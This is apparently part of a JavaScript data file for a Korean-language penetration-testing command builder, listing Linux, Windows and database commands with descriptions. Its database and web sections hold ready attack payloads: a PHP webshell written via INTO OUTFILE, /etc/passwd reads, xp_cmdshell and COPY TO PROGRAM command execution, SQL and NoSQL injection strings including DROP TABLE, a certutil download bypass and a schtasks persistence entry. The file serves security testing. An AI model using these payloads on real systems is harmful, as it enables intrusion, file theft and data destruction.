          { id: 'b', flag: '-b', label: '쿠키 전송', description: '요청에 포함할 쿠키 값을 지정합니다.', needsValue: true, placeholder: "'name=value'" },
          { id: 's', flag: '-s', label: '진행 상황 숨김', description: '스크립트에서 조용히 실행할 때 사용합니다.' },
          { id: 'v', flag: '-v', label: '상세 통신 로그', description: '요청·응답 헤더까지 모두 보여줍니다.' },
          { id: 'k', flag: '-k', label: 'SSL 인증서 검증 생략', description: '자체 서명 인증서 대상에도 접속을 허용합니다.' },
        ],
      },
      {
        id: 'ssh', name: 'ssh', base: 'ssh', targetPlaceholder: '사용자@호스트',
        options: [
          { id: 'p', flag: '-p', label: '접속 포트 지정', description: '기본(22)이 아닌 포트로 접속합니다.', needsValue: true, placeholder: '포트' },
          { id: 'i', flag: '-i', label: '개인 키 파일 지정', description: '비밀번호 대신 사용할 개인 키 파일을 지정합니다.', needsValue: true, placeholder: '키 파일 경로' },
          { id: 'L', flag: '-L', label: '로컬 포트 포워딩', description: '원격지의 특정 포트를 로컬로 터널링합니다.', needsValue: true, placeholder: '로컬포트:대상호스트:대상포트' },
          { id: 'D', flag: '-D', label: '동적 포트 포워딩', description: 'SOCKS 프록시로 동작하는 동적 터널을 구성합니다.', needsValue: true, placeholder: '포트' },
          { id: 'N', flag: '-N', label: '원격 명령 없이 포워딩만 유지', description: '셸을 열지 않고 터널링 전용으로 접속합니다.' },
          { id: 'f', flag: '-f', label: '백그라운드로 전환', description: '접속 후 세션을 백그라운드로 보냅니다.' },
          { id: 'v', flag: '-v', label: '상세 디버그 출력', description: '접속 과정을 자세히 표시합니다.' },
        ],
      },
      {
        id: 'ls', name: 'ls', base: 'ls', targetPlaceholder: '경로(생략 시 현재 디렉터리)',
        options: [
          { id: 'l', flag: '-l', label: '상세 정보로 표시', description: '권한, 소유자, 크기, 수정일을 함께 보여줍니다.' },
          { id: 'a', flag: '-a', label: '숨김 파일 포함 표시', description: '.으로 시작하는 숨김 파일도 함께 표시합니다.' },
          { id: 'h', flag: '-h', label: '읽기 쉬운 용량 단위', description: '바이트 대신 KB·MB 등 사람이 읽기 쉬운 단위로 표시합니다.' },
          { id: 'R', flag: '-R', label: '재귀적으로 표시', description: '하위 디렉터리 내용까지 모두 표시합니다.' },
          { id: 't', flag: '-t', label: '수정 시간순 정렬', description: '최근에 수정된 파일부터 정렬해 보여줍니다.' },
        ],
      },
      {
        id: 'ps', name: 'ps', base: 'ps',
        options: [
          { id: 'aux', flag: '-aux', label: '모든 프로세스 상세 표시', description: '모든 사용자의 전체 프로세스를 상세히 보여줍니다.' },
          { id: 'ef', flag: '-ef', label: '표준 형식 전체 프로세스', description: '부모 프로세스 정보를 포함한 표준 형식으로 보여줍니다.' },
          { id: 'sort', flag: '--sort', label: '정렬 기준 지정', description: 'CPU·메모리 사용량 등 기준으로 정렬합니다.', needsValue: true, placeholder: '-%cpu' },
        ],
      },
      {
        id: 'tar', name: 'tar', base: 'tar', targetPlaceholder: '아카이브 파일명',
        options: [
          { id: 'c', flag: '-c', label: '새 아카이브 생성', description: '지정한 파일들을 묶어 새 아카이브를 만듭니다.' },
          { id: 'x', flag: '-x', label: '아카이브 추출', description: '아카이브 파일 내용을 풀어냅니다.' },
          { id: 'z', flag: '-z', label: 'gzip 압축 사용', description: '아카이브를 gzip으로 압축·해제합니다.' },
          { id: 'v', flag: '-v', label: '진행 상황 출력', description: '처리 중인 파일 목록을 화면에 표시합니다.' },
          { id: 'f', flag: '-f', label: '파일명 지정', description: '다른 옵션과 함께 아카이브 파일 이름을 지정합니다.', needsValue: true, placeholder: 'archive.tar.gz' },
        ],
      },
      {
        id: 'wget', name: 'wget', base: 'wget', targetPlaceholder: 'URL',
        options: [
          { id: 'r', flag: '-r', label: '재귀적으로 다운로드', description: '링크를 따라가며 사이트를 통째로 내려받습니다.' },
          { id: 'np', flag: '-np', label: '상위 디렉터리로 올라가지 않음', description: '재귀 다운로드 범위를 현재 경로 하위로 제한합니다.' },
          { id: 'O', flag: '-O', label: '저장 파일명 지정', description: '다운로드한 내용을 저장할 파일명을 지정합니다.', needsValue: true, placeholder: '파일명' },
          { id: 'q', flag: '-q', label: '진행 상황 숨김', description: '다운로드 진행 표시 없이 조용히 실행합니다.' },
          { id: 'b', flag: '-b', label: '백그라운드로 다운로드', description: '다운로드를 백그라운드로 전환하고 로그 파일에 기록합니다.' },
        ],
      },
      {
        id: 'scp', name: 'scp', base: 'scp', targetPlaceholder: '원본경로 사용자@호스트:대상경로',
        options: [
          { id: 'r', flag: '-r', label: '디렉터리 전체 복사', description: '디렉터리와 그 안의 내용을 재귀적으로 복사합니다.' },
          { id: 'P', flag: '-P', label: '포트 지정', description: 'ssh와 달리 대문자 -P로 포트를 지정합니다.', needsValue: true, placeholder: '포트' },
          { id: 'i', flag: '-i', label: '개인 키 파일 지정', description: '비밀번호 대신 사용할 개인 키 파일을 지정합니다.', needsValue: true, placeholder: '키 파일 경로' },
        ],
      },
      {
        id: 'chown', name: 'chown', base: 'chown', targetPlaceholder: '사용자:그룹 대상',
        options: [
          { id: 'R', flag: '-R', label: '재귀 적용', description: '하위 디렉터리까지 모두 소유자를 변경합니다.' },
        ],
      },
      {
        id: 'tcpdump', name: 'tcpdump', base: 'tcpdump', targetPlaceholder: '필터 표현식(예: port 80)',
        options: [
          { id: 'i', flag: '-i', label: '캡처할 인터페이스 지정', description: '패킷을 캡처할 네트워크 인터페이스를 지정합니다.', needsValue: true, placeholder: 'eth0' },
          { id: 'n', flag: '-n', label: '이름 해석 생략', description: '주소·포트를 이름 대신 숫자로 표시합니다.' },
          { id: 'w', flag: '-w', label: '캡처 내용 파일 저장', description: '캡처한 패킷을 분석 도구에서 열 수 있는 파일로 저장합니다.', needsValue: true, placeholder: 'capture.pcap' },
          { id: 'c', flag: '-c', label: '지정 개수만 캡처 후 종료', description: '패킷 개수를 지정해 그만큼만 캡처하고 종료합니다.', needsValue: true, placeholder: '100' },
          { id: 'X', flag: '-X', label: '16진수·아스키로 함께 출력', description: '패킷 내용을 16진수와 아스키 문자로 함께 보여줍니다.' },
        ],
      },
      {
        id: 'sudo', name: 'sudo', base: 'sudo', targetPlaceholder: '실행할 명령',
        options: [
          { id: 'l', flag: '-l', label: '실행 가능한 sudo 권한 확인', description: '현재 사용자가 sudo로 실행할 수 있는 명령 목록을 확인합니다 — 권한 상승 가능 여부 점검에 자주 사용됩니다.' },
          { id: 'u', flag: '-u', label: '다른 사용자 권한으로 실행', description: 'root가 아닌 다른 사용자 권한으로 명령을 실행합니다.', needsValue: true, placeholder: '사용자명' },
        ],
      },
    ],
  },
  {
    id: 'windows',
    name: 'Windows 명령어',
    tools: [
      {
        id: 'whoami', name: 'whoami', base: 'whoami',
        options: [
          { id: 'priv', flag: '/priv', label: '현재 사용자 권한 목록 표시', description: '현재 사용자의 권한 목록을 표시합니다.' },
          { id: 'groups', flag: '/groups', label: '소속 그룹 목록 표시', description: '현재 사용자가 속한 그룹 목록을 표시합니다.' },
          { id: 'all', flag: '/all', label: '전체 정보 표시', description: '사용자·그룹·권한 정보를 모두 표시합니다.' },
        ],
      },
      {
        id: 'ipconfig', name: 'ipconfig', base: 'ipconfig',
        options: [
          { id: 'all', flag: '/all', label: '전체 어댑터 정보 표시', description: '모든 네트워크 어댑터의 상세 정보를 표시합니다.' },
          { id: 'flushdns', flag: '/flushdns', label: 'DNS 캐시 삭제', description: '로컬 DNS 캐시를 비웁니다.' },
          { id: 'release', flag: '/release', label: 'IP 주소 해제', description: '현재 할당된 IP 주소를 해제합니다.' },
          { id: 'renew', flag: '/renew', label: 'IP 주소 갱신', description: 'DHCP 서버에 새 IP 주소를 요청합니다.' },
        ],
      },
      {
        id: 'ping', name: 'ping', base: 'ping', targetPlaceholder: '대상 호스트',
        options: [
          { id: 't', flag: '-t', label: '중단할 때까지 계속 전송', description: 'Ctrl+C로 멈출 때까지 계속 핑을 보냅니다.' },
          { id: 'n', flag: '-n', label: '전송 횟수 지정', description: '보낼 핑 패킷 개수를 지정합니다.', needsValue: true, placeholder: '4' },
          { id: 'l', flag: '-l', label: '패킷 크기 지정', description: '전송할 패킷 크기를 바이트 단위로 지정합니다.', needsValue: true, placeholder: '1024' },
        ],
      },
      {
        id: 'nslookup', name: 'nslookup', base: 'nslookup', targetPlaceholder: '조회할 도메인',
        options: [
          { id: 'type', flag: '-type=', label: '조회할 레코드 종류 지정', description: 'MX, TXT, NS 등 조회할 DNS 레코드 종류를 지정합니다.', needsValue: true, placeholder: 'MX' },
        ],
      },
      {
        id: 'netstat-windows', name: 'netstat', base: 'netstat',
        options: [
          { id: 'a', flag: '-a', label: '모든 연결 표시', description: '모든 연결과 리슨 포트를 표시합니다.' },
          { id: 'n', flag: '-n', label: '숫자로 표시', description: '주소·포트를 이름 조회 없이 숫자로 표시합니다.' },
          { id: 'o', flag: '-o', label: 'PID 표시', description: '연결을 소유한 프로세스의 PID를 표시합니다.' },
          { id: 'b', flag: '-b', label: '실행 파일명 표시', description: '연결에 사용된 실행 파일명을 표시합니다 — 관리자 권한이 필요합니다.' },
        ],
      },
      {
        id: 'tasklist', name: 'tasklist', base: 'tasklist',
        options: [
          { id: 'v', flag: '/v', label: '자세한 정보 표시', description: '프로세스의 상세 정보를 함께 표시합니다.' },
          { id: 'svc', flag: '/svc', label: '서비스 목록 표시', description: '프로세스별로 실행 중인 서비스를 표시합니다.' },
          { id: 'fi', flag: '/fi', label: '필터 조건으로 검색', description: '특정 조건에 맞는 프로세스만 표시합니다.', needsValue: true, placeholder: '"IMAGENAME eq notepad.exe"' },
        ],
      },
      {
        id: 'net-user', name: 'net user', base: 'net user',
        note: '인자 없이 net user만 실행하면 로컬 사용자 계정 목록을 표시합니다.',
        options: [
          { id: 'domain', flag: '/domain', label: '도메인 계정 대상', description: '로컬이 아닌 도메인 계정을 대상으로 조회·작업합니다.' },
          { id: 'add', flag: '', label: '계정 추가', description: '사용자명·비밀번호 뒤에 /add를 붙여 새 계정을 만듭니다.', needsValue: true, placeholder: '사용자명 비밀번호 /add' },
        ],
      },
      {
        id: 'schtasks', name: 'schtasks', base: 'schtasks',
        options: [
          { id: 'query', flag: '/query', label: '예약 작업 목록 조회', description: '등록된 예약 작업 목록을 조회합니다.' },
          { id: 'create', flag: '/create', label: '새 예약 작업 등록', description: '지속성(persistence) 확보 목적으로도 자주 활용됩니다.', needsValue: true, placeholder: '/tn 이름 /tr 명령 /sc onlogon' },
          { id: 'delete', flag: '/delete', label: '예약 작업 삭제', description: '지정한 이름의 예약 작업을 삭제합니다.', needsValue: true, placeholder: '/tn 이름' },
        ],
      },
      {
        id: 'wmic', name: 'wmic', base: 'wmic', joiner: '\n',
        note: '항목마다 완전한 하위 명령 형태로 되어 있어, 선택하면 그대로 한 줄씩 나열됩니다.',
        options: [
          { id: 'qfe', flag: 'qfe', label: '설치된 보안 패치 목록 조회', description: '커널 익스플로잇 대상 확인에 자주 사용됩니다.' },
          { id: 'process', flag: 'process list brief', label: '실행 중인 프로세스 목록 조회', description: '현재 실행 중인 프로세스를 간략히 나열합니다.' },
          { id: 'product', flag: 'product get name,version', label: '설치된 프로그램 목록 조회', description: '설치된 소프트웨어 이름과 버전을 조회합니다.' },
          { id: 'useraccount', flag: 'useraccount get name,sid', label: '사용자 계정과 SID 조회', description: '로컬 사용자 계정과 보안 식별자(SID)를 조회합니다.' },
        ],
      },
      {
        id: 'sc', name: 'sc (서비스 제어)', base: 'sc', targetPlaceholder: '서비스명',
        options: [
          { id: 'query', flag: 'query', label: '서비스 상태 조회', description: '지정한 서비스의 현재 상태를 조회합니다.' },
          { id: 'qc', flag: 'qc', label: '서비스 설정 정보 조회', description: '서비스의 실행 파일 경로 등 설정 정보를 조회합니다.' },
          { id: 'config', flag: 'config', label: '서비스 설정 변경', description: '실행 파일 경로 등을 변경합니다 — 권한 상승에 악용되기도 합니다.' },
          { id: 'start', flag: 'start', label: '서비스 시작', description: '지정한 서비스를 시작합니다.' },
          { id: 'stop', flag: 'stop', label: '서비스 중지', description: '지정한 서비스를 중지합니다.' },
        ],
      },
      {
        id: 'icacls', name: 'icacls', base: 'icacls', targetPlaceholder: '대상 파일·디렉터리',
        options: [
          { id: 'grant', flag: '/grant', label: '권한 부여', description: '지정한 사용자에게 권한을 부여합니다.', needsValue: true, placeholder: '사용자명:(F)' },
          { id: 'deny', flag: '/deny', label: '권한 거부', description: '지정한 사용자의 권한을 거부합니다.', needsValue: true, placeholder: '사용자명:(F)' },
          { id: 'reset', flag: '/reset', label: '기본 권한으로 초기화', description: '상속된 기본 권한으로 되돌립니다.' },
        ],
      },
      {
        id: 'certutil', name: 'certutil', base: 'certutil',
        options: [
          { id: 'urlcache', flag: '-urlcache -split -f', label: '파일 다운로드', description: '원격 URL에서 파일을 받아옵니다 — 다운로드 우회 수단으로도 자주 언급됩니다.', needsValue: true, placeholder: 'URL 저장파일명' },
          { id: 'decode', flag: '-decode', label: 'Base64 디코딩', description: '인코딩된 파일을 원본으로 디코딩합니다.', needsValue: true, placeholder: '입력파일 출력파일' },
          { id: 'encode', flag: '-encode', label: 'Base64 인코딩', description: '파일을 Base64로 인코딩합니다.', needsValue: true, placeholder: '입력파일 출력파일' },
        ],
      },
      {
        id: 'powershell', name: 'PowerShell 기본 명령어', base: '', joiner: '\n',
        note: 'PowerShell 콘솔 안에서 입력하는 대표적인 명령(cmdlet)들입니다.',
        options: [
          { id: 'get-process', flag: 'Get-Process', label: '프로세스 목록 조회', description: '실행 중인 프로세스 목록을 조회합니다.' },
          { id: 'get-service', flag: 'Get-Service', label: '서비스 목록 조회', description: '서비스 목록과 상태를 조회합니다.' },
          { id: 'get-localuser', flag: 'Get-LocalUser', label: '로컬 사용자 계정 조회', description: '로컬 사용자 계정 목록을 조회합니다.' },
          { id: 'get-childitem', flag: 'Get-ChildItem -Recurse -Force', label: '숨김 파일 포함 재귀 목록 조회', description: '숨김 파일까지 포함해 하위 디렉터리를 모두 나열합니다.' },
          { id: 'invoke-webrequest', flag: 'Invoke-WebRequest -Uri 대상URL -OutFile 파일명', label: '파일 다운로드', description: '지정한 URL에서 파일을 내려받아 저장합니다.' },
          { id: 'set-executionpolicy', flag: 'Set-ExecutionPolicy Bypass -Scope Process', label: '스크립트 실행 제한 우회', description: '현재 프로세스에서만 스크립트 실행 정책을 무시합니다.' },
        ],
      },
      {
        id: 'systeminfo', name: 'systeminfo', base: 'systeminfo',
        options: [],
        note: '옵션 없이 실행하면 OS 버전, 패치 내역, 하드웨어 정보 등 시스템 전체 정보를 출력합니다.',
      },
      {
        id: 'reg-query', name: 'reg query', base: 'reg query',
        options: [
          { id: 'key', flag: '', label: '조회할 키 경로', description: '조회할 레지스트리 키의 전체 경로를 지정합니다.', needsValue: true, placeholder: 'HKLM\\Software\\...' },
          { id: 's', flag: '/s', label: '재귀 조회', description: '하위 키까지 모두 조회합니다.' },
          { id: 'v', flag: '/v', label: '특정 값 조회', description: '키 안의 특정 값 이름만 조회합니다.', needsValue: true, placeholder: '값 이름' },
        ],
      },
    ],
  },
  {
    id: 'database',
    name: '데이터베이스 (SQL)',
    tools: [
      {
        id: 'mysql-recon', name: 'MySQL 점검 명령어', base: '', joiner: '\n',
        note: '기본 SELECT 문법보다는 실제 점검에서 자주 쓰는 정보 수집용 구문 위주입니다.',
        options: [
          { id: 'version', flag: 'SELECT @@version;', label: 'DBMS 버전 확인', description: '연결된 MySQL 서버의 버전 정보를 확인합니다.' },
          { id: 'current-user', flag: 'SELECT current_user();', label: '현재 접속 계정 확인', description: '현재 로그인된 데이터베이스 계정을 확인합니다.' },
          { id: 'show-databases', flag: 'SHOW DATABASES;', label: '데이터베이스 목록', description: '서버에 존재하는 전체 데이터베이스 이름을 나열합니다.' },
          { id: 'list-tables', flag: 'SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();', label: '테이블 목록 조회', description: '현재 데이터베이스의 테이블 이름을 조회합니다.' },
          { id: 'list-columns', flag: "SELECT column_name FROM information_schema.columns WHERE table_name='대상테이블';", label: '컬럼 목록 조회', description: '지정한 테이블의 컬럼 이름을 조회합니다(대상테이블을 실제 이름으로 바꿔서 사용).' },
          { id: 'load-file', flag: "SELECT LOAD_FILE('/etc/passwd');", label: '서버 파일 읽기 시도', description: 'FILE 권한이 있는 계정에서 서버의 로컬 파일을 읽어올 수 있는지 확인합니다.' },
          { id: 'into-outfile', flag: "SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php';", label: '웹셸 파일 쓰기 시도', description: 'FILE 권한과 웹 루트 쓰기 권한이 있을 때 웹셸을 심을 수 있는지 확인합니다.' },
        ],
      },
      {
        id: 'mssql-recon', name: 'MSSQL 점검 명령어', base: '', joiner: '\n',
        options: [
          { id: 'version', flag: 'SELECT @@version;', label: 'DBMS 버전 확인', description: '연결된 MSSQL 서버의 버전 정보를 확인합니다.' },
          { id: 'current-user', flag: 'SELECT SYSTEM_USER;', label: '현재 접속 계정 확인', description: '현재 로그인된 데이터베이스 계정을 확인합니다.' },
          { id: 'is-sysadmin', flag: "SELECT IS_SRVROLEMEMBER('sysadmin');", label: '관리자 권한 여부 확인', description: '현재 계정이 sysadmin 권한을 가졌는지 확인합니다.' },
          { id: 'list-databases', flag: 'SELECT name FROM sys.databases;', label: '데이터베이스 목록 조회', description: '서버에 존재하는 전체 데이터베이스 이름을 나열합니다.' },
          { id: 'list-tables', flag: 'SELECT table_name FROM information_schema.tables;', label: '테이블 목록 조회', description: '현재 데이터베이스의 테이블 이름을 조회합니다.' },
          { id: 'xp-cmdshell-enable', flag: "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", label: 'xp_cmdshell 활성화 시도', description: '활성화되면 OS 명령 실행이 가능해집니다(높은 권한 필요).' },
          { id: 'xp-cmdshell-exec', flag: "EXEC xp_cmdshell 'whoami';", label: 'OS 명령 실행 시도', description: 'xp_cmdshell이 활성화된 경우 서버의 OS 명령을 실행합니다.' },
          { id: 'linked-servers', flag: 'EXEC sp_linkedservers;', label: '연결된 서버 목록 조회', description: '다른 DB 서버로 피벗할 수 있는지 확인합니다.' },
        ],
      },
      {
        id: 'postgres-recon', name: 'PostgreSQL 점검 명령어', base: '', joiner: '\n',
        note: "\\l, \\dt는 psql 콘솔 전용 메타 명령이고 나머지는 일반 SQL 구문입니다.",
        options: [
          { id: 'version', flag: 'SELECT version();', label: 'DBMS 버전 확인', description: '연결된 PostgreSQL 서버의 버전 정보를 확인합니다.' },
          { id: 'current-user', flag: 'SELECT current_user;', label: '현재 접속 계정 확인', description: '현재 로그인된 데이터베이스 계정을 확인합니다.' },
          { id: 'is-superuser', flag: 'SELECT usesuper FROM pg_user WHERE usename=current_user;', label: '관리자 권한 여부 확인', description: '현재 계정이 슈퍼유저 권한을 가졌는지 확인합니다.' },
          { id: 'list-databases', flag: '\\l', label: '데이터베이스 목록 조회', description: 'psql 콘솔에서 데이터베이스 목록을 조회하는 메타 명령입니다.' },
          { id: 'list-tables', flag: '\\dt', label: '테이블 목록 조회', description: 'psql 콘솔에서 테이블 목록을 조회하는 메타 명령입니다.' },
          { id: 'read-file', flag: "SELECT pg_read_file('/etc/passwd');", label: '서버 파일 읽기 시도', description: '슈퍼유저 권한이 있을 때 서버의 로컬 파일을 읽을 수 있습니다.' },
          { id: 'copy-program', flag: "COPY (SELECT '') TO PROGRAM 'id';", label: 'OS 명령 실행 시도', description: 'COPY ... TO PROGRAM으로 명령 실행을 시도합니다(슈퍼유저 권한 필요).' },
        ],
      },
      {
        id: 'sql-injection', name: 'SQL Injection 테스트 구문', base: '', joiner: '\n',
        note: '각 구문은 상황에 맞는 대안 테스트 페이로드입니다 — 실제 점검 대상에는 사전에 허가된 범위 안에서만 사용하세요.',
        options: [
          { id: 'auth-bypass', flag: "' OR '1'='1' -- ", label: '인증 우회 시도', description: '항상 참이 되는 조건으로 로그인 폼 등의 인증 로직 우회 여부를 확인합니다.' },
          { id: 'union-columns', flag: "' UNION SELECT NULL,NULL-- ", label: 'UNION 기반 컬럼 수 확인', description: 'NULL 개수를 늘려가며 원본 쿼리의 컬럼 수를 추정합니다.' },
          { id: 'blind-boolean', flag: "' AND 1=1-- 그리고 ' AND 1=2--", label: '블라인드 SQLi(불리언 기반)', description: '참/거짓 조건에 따라 응답이 달라지는지 비교해 인젝션 가능성을 판단합니다.' },
          { id: 'blind-time', flag: "' AND SLEEP(5)-- ", label: '블라인드 SQLi(시간 기반)', description: '응답 지연 여부로 인젝션 가능성을 판단합니다(MySQL 기준).' },
          { id: 'error-based', flag: "' AND 1=CONVERT(int,(SELECT @@version))-- ", label: '에러 기반 정보 노출 유도', description: '타입 변환 에러 메시지에 정보가 노출되는지 확인합니다(MSSQL 기준).' },
          { id: 'stacked', flag: "'; DROP TABLE 대상테이블;--", label: '스태킹 쿼리 테스트', description: '세미콜론으로 쿼리를 이어붙일 수 있는지 확인합니다 — 실제 대상에는 절대 실행하지 마세요.' },
        ],
      },
      {
        id: 'nosql-injection', name: 'NoSQL Injection 테스트 구문 (MongoDB)', base: '', joiner: '\n',
        note: '주로 JSON 형태의 쿼리 파라미터에 그대로 대입해 응답 변화를 관찰하는 방식입니다.',
        options: [
          { id: 'auth-bypass-ne', flag: '{"username": {"$ne": null}, "password": {"$ne": null}}', label: '인증 우회 시도', description: '$ne 연산자로 조건을 무력화해 로그인 우회 여부를 확인합니다.' },
          { id: 'auth-bypass-regex', flag: '{"username": "admin", "password": {"$regex": "^a"}}', label: '정규식 기반 우회 시도', description: '$regex로 값을 한 글자씩 추측하며 인증 우회를 시도합니다.' },
          { id: 'gt-blind', flag: '{"password": {"$gt": ""}}', label: '블라인드 NoSQLi(비교 연산자)', description: '$gt/$lt 연산자로 참/거짓을 유도해 데이터를 추정합니다.' },
          { id: 'js-injection', flag: "'; return true; var x='", label: '서버 사이드 JS 인젝션 시도', description: '$where 등 JavaScript가 실행되는 구문에 삽입해 로직 우회를 시도합니다.' },
        ],
      },
    ],
  },
  {
    id: 'web-app',
    name: '웹 애플리케이션',
    tools: [
      {
        id: 'xss-payloads', name: 'XSS 페이로드', base: '', options: [],
        note: '조합형 빌더입니다 — 아래 목록에서 이 도구를 선택하면 태그·이벤트·실행 코드·우회 기법을 직접 조합할 수 있습니다.',
      },
    ],
  },
]
